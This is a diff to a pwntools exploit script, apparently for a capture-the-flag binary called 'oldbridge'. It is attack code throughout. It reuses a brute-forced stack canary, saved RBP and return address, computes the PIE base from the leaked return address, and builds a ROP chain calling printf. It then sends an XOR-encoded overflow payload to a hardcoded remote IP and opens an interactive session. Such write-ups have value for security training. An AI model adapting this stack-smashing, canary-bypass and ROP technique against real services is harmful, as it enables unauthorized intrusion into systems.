@@ -12,7 +12,7 @@ exe = context.binary = ELF('./exe/oldbridge')
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
 host = args.HOST or '88.198.233.174'
-port = int(args.PORT or 33429)
+port = int(args.PORT or 38607)
 
 def local(argv=[], *a, **kw):
     '''Connect to the process on the local host'''
@@ -79,7 +79,7 @@ SUCCESS_MSG = "Username found!"
 PROMPT_MSG = "Username: "
 
 # create session
-context.terminal = ['xfce4-terminal', '-e']
+context.terminal = ['gnome-terminal', '-e']
 config = {}
 create_session("oldbridge", args.LOCAL)
 
@@ -160,27 +160,28 @@ log.info("RBP: " + hex(u64(config['rbp'])))
 log.info("RIP: " + hex(u64(config['rip'])))
 
 # check if leaked values are still good (debug only)
-"""alive = server_check(buffer_size,
+alive = server_check(buffer_size,
                      config['cookie'] + config['rbp'] + config['rip'])
 if not alive:
     log.error("Run bruteforce again")
 else:
     log.success("All good")
-"""
 
 def craft(data):
     payload = username + cyclic(buffer_size - len(username)) + data
     return xor13(payload)
 
-printf_plt = 0x940
-rip_printf = u64(config['rip']) // 0x10000 * 0x10000 + printf_plt
-log.info("printf@plt: " + hex(rip_printf))
+exe.address = u64(config['rip']) - 0xECA
+log.info("EXE base: " + hex(exe.address))
 
-payload = craft(config['cookie'] + config['rbp'] + p64(rip_printf))
+rop = ROP(exe)
+rop.printf(exe.address + 0xFA6)
+log.info(rop.dump())
 
+payload = craft(config['cookie'] + config['rbp'] + rop.chain())
 io = start()
 log.info("Payload: " + payload)
 io.sendafter(PROMPT_MSG, payload)
-print ("DATA:" + io.clean())
+io.interactive()
 # save the session
 save_vars(config)
